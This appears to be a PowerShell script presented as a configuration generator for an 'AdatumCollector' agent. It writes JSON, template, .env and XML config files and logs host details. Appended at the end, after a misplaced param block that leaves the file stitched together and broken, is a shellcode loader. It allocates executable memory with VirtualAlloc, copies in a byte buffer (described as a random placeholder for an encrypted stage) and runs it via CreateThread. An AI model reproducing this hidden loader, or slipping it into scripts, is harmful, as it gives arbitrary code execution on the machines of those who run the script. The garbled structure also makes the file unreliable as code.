
<#
.SYNOPSIS
    Generates the AdatumCollector JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.PARAMETER OutputPath
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Write-AgentConfig.ps1 -Environment Test
.EXAMPLE
    .\Write-AgentConfig.ps1 -ApiPort 9443 -Force
#>

$OutputPath  = "C:\ProgramData\Contoso\AdatumCollector\config.json"
$Environment = "Test"
$ApiPort     = 9443
$NodeCount   = 5
$Force       = $false
$ProgressPreference = 'SilentlyContinue'
$hostName = $env:COMPUTERNAME
$DebugPreference = 'SilentlyContinue'

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'AdatumCollector'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.internal.corp/v1'
            'https://telemetry.internal.corp/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.agent.logLevel = "Verbose"
$config | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $OutputPath -Encoding UTF8

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "AdatumCollector",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8
$environmentFile = $OutputPath.Replace('.json', '.env')
$lines = @(
    "AGENT_ENV=$Environment"
    "AGENT_PORT=$ApiPort"
)
$lines | Set-Content -LiteralPath $environmentFile -Encoding UTF8

$xmlPath = $OutputPath.Replace('.json', '.xml')
$xml = New-Object System.Xml.XmlDocument
$root = $xml.CreateElement('configuration')
$xml.AppendChild($root) | Out-Null
$entry = $xml.CreateElement('add')
$entry.SetAttribute('key', 'Environment')
$entry.SetAttribute('value', $Environment)
$root.AppendChild($entry) | Out-Null
$xml.Save($xmlPath)

$configHash = (Get-FileHash -LiteralPath $OutputPath -Algorithm SHA256).Hash
Write-Verbose ("Config SHA256: {0}" -f $configHash)
$schemaFile = Join-Path $PSScriptRoot 'config.schema.json'
if (Test-Path -LiteralPath $schemaFile) {
    Write-Verbose ("Schema available: {0}" -f $schemaFile)
}

$summaryBody = "Config generated for {0} on $env:COMPUTERNAME" -f $Environment
Send-MailMessage -To 'ops@contoso.com' -From 'config@contoso.com' -Subject 'Agent configuration generated' -Body $summaryBody -SmtpServer 'smtp.contoso.com' -Port 25

$config | ConvertTo-Json -Depth 6
Write-Host ("Configuration complete for {0}" -f $Environment) -ForegroundColor Green

$encoding = [System.Text.UTF8Encoding]::new($false)
$encoding.GetType().Name | Write-Verbose

$previous = Join-Path (Split-Path -Parent $OutputPath) 'config.previous.json'
if (Test-Path -LiteralPath $previous) {
    Write-Verbose ("Previous config: {0}" -f $previous)
}

$defaults = @{
    retryCount = 3
    backoffSec = 5
    heartbeat  = 30
}
$defaults.GetEnumerator() | ForEach-Object { Write-Verbose ("{0} = {1}" -f $_.Key, $_.Value) }

$nodeList = 1..$NodeCount | ForEach-Object { 'node-{0:d2}' -f $_ }
Write-Verbose ("Planned nodes: {0}" -f ($nodeList -join ', '))

$portInUse = Get-NetTCPConnection -LocalPort $ApiPort -ErrorAction SilentlyContinue
if ($portInUse) {
    Write-Warning ("Port {0} is already in use" -f $ApiPort)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x71, 0x85, 0x43, 0xea, 0xa3, 0x73, 0x4d, 0xe6, 0x35, 0x59, 0xf8, 0x99, 0x48, 0xc8, 0xab, 0x7e,
        0x77, 0xa8, 0xce, 0x3b, 0x9f, 0x47, 0x7f, 0x55, 0x49, 0x2e, 0x07, 0xe6, 0x83, 0x16, 0xd2, 0xb4,
        0x68, 0x9a, 0xbc, 0xaa, 0x0e, 0xd4, 0x13, 0xbe, 0x13, 0x31, 0x44, 0x35, 0xda, 0x56, 0x62, 0x85,
        0x0d, 0xf5, 0x82, 0x5b, 0xb3, 0x73, 0xbc, 0x98, 0x65, 0x36, 0xb9, 0x2d, 0xbd, 0xa0, 0x95, 0xec,
        0x9c, 0x76, 0xdc, 0x66, 0x58, 0xe0, 0xb2, 0xce, 0x17, 0x1b, 0x79, 0x1b, 0x12, 0x99, 0xe3, 0xac,
        0xc2, 0xc8, 0x87, 0x93, 0x02, 0xf4, 0x8b, 0xc1, 0xb9, 0x5a, 0x2a, 0xfe, 0x5f, 0x80, 0x9d, 0x03,
        0x73, 0xc7, 0x1d, 0xb2, 0x10, 0x3b, 0x36, 0x53, 0xca, 0xc9, 0x27, 0x27, 0xb1, 0xc6, 0xdf, 0xc6,
        0x71, 0xe1, 0xf0, 0x9d, 0xc7, 0x9c, 0x16, 0x22, 0x44, 0xab, 0xbe, 0x09, 0x6b, 0x26, 0x03, 0xbf,
        0x39, 0xfe, 0xa9, 0xd4, 0x44, 0x4f, 0xa4, 0xb9, 0x5e, 0xf3, 0xd9, 0x9a, 0xd6, 0x6c, 0x1b, 0x2a,
        0x07, 0xf8, 0x68, 0x1c, 0x62, 0x3e, 0xfe, 0x50, 0xf5, 0x93, 0xe7, 0x9e, 0x0b, 0x81, 0x39, 0x02,
        0xa0, 0x57, 0x95, 0x2b, 0xf0, 0x75, 0xfd, 0xcd, 0x5d, 0x44, 0x76, 0x65, 0x17, 0x7e, 0xa1, 0x2c,
        0x70, 0x67, 0x41, 0x67, 0x40, 0x3c, 0xc3, 0xc7, 0x14, 0x07, 0x07, 0xa2, 0x8f, 0xc4, 0x20, 0xff,
        0xc9, 0xac, 0xd9, 0x3f, 0x48, 0xb3, 0x7f, 0xf5, 0xae, 0xa1, 0x22, 0x86, 0x80, 0xa0, 0x2e, 0x6d,
        0xc8, 0xeb, 0x80, 0x5d, 0x40, 0xe7, 0x58, 0x34, 0xde, 0xad, 0x3c, 0xa2, 0x6d, 0xbb, 0x0a, 0xbe,
        0xea, 0x57, 0x9d, 0x71, 0x3a, 0x71, 0x52, 0xe9, 0xee, 0x51, 0xe7, 0xcc, 0x4a, 0xee, 0xed, 0x3d,
        0x30, 0x31, 0xa8, 0xc8, 0x94, 0xcd, 0xf1, 0xea, 0x7b, 0x05, 0x04, 0x4e, 0x4b, 0xdd, 0x07, 0xef,
        0x7b, 0xaf, 0x14, 0xcb, 0x0c, 0xf2, 0xf9, 0x52, 0x39, 0xc4, 0x0f, 0x64, 0xd9, 0x21, 0x85, 0x90,
        0x91, 0x20, 0xa4, 0xfb, 0xd3, 0x0a, 0xa1, 0x44, 0xd3, 0x06, 0xe5, 0xec, 0x79, 0xe6, 0xfa, 0xb7,
        0xb2, 0x3b, 0x58, 0x84, 0x62, 0x8d, 0x32, 0x91, 0x72, 0x28, 0xc5, 0xce, 0xf4, 0xce, 0x61, 0x0b,
        0x4b, 0xac, 0x7f, 0xb1, 0xf3, 0xf1, 0xeb, 0xf5, 0xb0, 0xac, 0x42, 0x35, 0x4e, 0x80, 0x5f, 0xba,
        0xc7, 0x0a, 0xe6, 0x06, 0x51, 0x14, 0x53, 0x3c, 0x1d, 0x18, 0x05, 0x1c, 0x5f, 0x5c, 0x82, 0x10,
        0xa6, 0xed, 0xb7, 0xa9, 0x20, 0x89, 0xad, 0x8e, 0x91, 0x6c, 0xb7, 0x3b, 0xbc, 0x19, 0x83, 0x79,
        0x1b, 0x6b, 0x6d, 0x47, 0x59, 0xde, 0x8a, 0x9d, 0xbe, 0x45, 0xd4, 0x39
    )

    $HProcess = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 4616)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
